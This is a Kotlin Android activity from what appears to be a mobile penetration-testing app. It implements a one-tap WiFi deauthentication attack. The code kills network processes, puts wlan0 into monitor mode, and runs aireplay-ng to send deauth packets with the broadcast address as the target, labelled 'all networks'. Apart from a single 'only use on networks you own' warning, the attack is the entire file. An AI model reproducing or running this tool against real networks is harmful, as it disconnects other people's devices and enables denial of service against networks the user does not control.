package com.android.pen15.ui.network

import android.os.Bundle
import androidx.lifecycle.lifecycleScope
import com.android.pen15.R
import com.android.pen15.ui.base.BaseToolActivity
import com.android.pen15.utils.ToolChecker
import kotlinx.coroutines.launch

class WiFiDeauthActivity : BaseToolActivity() {

    private var toolAvailable = false

    override fun getToolName() = "WiFi Deauth Attack"
    override fun getLayoutResource() = R.layout.activity_generic_tool
    override fun onToolExecute() { startDeauth() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        logMessage("WiFi Deauth Attack", includeTimestamp = false)
        logMessage("⚠️ ONLY USE ON NETWORKS YOU OWN!", includeTimestamp = false)
        logMessage("")
        logMessage("Sends deauth packets to disconnect clients", includeTimestamp = false)
        logMessage("")

        // Check tool availability
        lifecycleScope.launch {
            val hasAirmonNg = ToolChecker.checkToolAvailable(this@WiFiDeauthActivity, "airmon-ng")
            val hasAireplayNg = ToolChecker.checkToolAvailable(this@WiFiDeauthActivity, "aireplay-ng")
            toolAvailable = hasAirmonNg && hasAireplayNg

            if (!toolAvailable) {
                logMessage("⚠️ aircrack-ng suite not installed!", includeTimestamp = false)
                logMessage("", includeTimestamp = false)
                logMessage("Install with:", includeTimestamp = false)
                logMessage("${ToolChecker.getInstallCommand("aircrack-ng")}", includeTimestamp = false)
                logMessage("")
                logMessage("⚠️ May require root access!", includeTimestamp = false)
                executeButton.isEnabled = false
            } else {
                logMessage("✓ aircrack-ng suite is available", includeTimestamp = false)
                logMessage("")
                logMessage("⚠️ This attack requires monitor mode", includeTimestamp = false)
                logMessage("⚠️ May require root/termux-root", includeTimestamp = false)
                logMessage("")
                logMessage("Target: Broadcast (all networks)", includeTimestamp = false)
                logMessage("Deauth count: 10 packets", includeTimestamp = false)
            }
        }
    }

    private fun startDeauth() {
        if (!toolAvailable) {
            logMessage("ERROR: aircrack-ng suite not available")
            return
        }

        clearOutput()
        logMessage("Starting WiFi deauth attack...")
        logMessage("")
        logMessage("Step 1: Killing interfering processes...")
        executeCommandWithProgress("airmon-ng check kill", useTermux = true)

        logMessage("")
        logMessage("Step 2: Enabling monitor mode on wlan0...")
        executeCommandWithProgress("airmon-ng start wlan0", useTermux = true)

        logMessage("")
        logMessage("Step 3: Sending deauth packets...")
        logMessage("Target: FF:FF:FF:FF:FF:FF (broadcast)")
        executeCommandWithProgress("aireplay-ng --deauth 10 -a FF:FF:FF:FF:FF:FF wlan0mon", useTermux = true)

        logMessage("")
        logMessage("✓ Attack complete!")
        logMessage("")
        logMessage("To stop monitor mode, run:")
        logMessage("airmon-ng stop wlan0mon", includeTimestamp = false)
    }
}
